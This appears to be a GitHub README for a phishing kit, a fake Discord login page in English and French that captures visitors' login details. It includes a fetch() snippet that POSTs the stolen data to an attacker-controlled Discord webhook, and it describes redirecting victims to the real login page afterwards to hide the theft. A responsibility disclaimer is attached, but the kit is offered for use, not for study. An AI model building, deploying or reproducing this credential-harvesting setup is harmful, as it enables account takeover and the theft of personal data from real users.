
# Discord Fake Login Page

This is a fake Discord login page, in HTML, CSS and Javascript.
I am in no way responsible for what you do with this code!

# Requirement
- Discord Webhook
I used discord's webhook api to allow transferring user information.

# Functionality
- Send the informations to discord

- Links like the registration page or the "I forgot my password" page do not work.
- When the user clicks on the login button, it will display an alert then redirect to the real discord login page, you can easily modify this by going to the script.js file which is located in the /en/ folder if you want the page to be in English or /fr/ if you want the page to be in French.

## Discord Webhook

#### Fetch

```txt
  fetch('https://discord.com/api/webhooks/ // url of your Webhook', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(data)
        })
```
#### More informations about discord webhook

```link
  https://discord.com/developers/docs/resources/webhook
```

## Warning !
#### I am in no way responsible for what you do with this code!

## Author

- Julus the developper, on Github
- mq_julus, on Discord
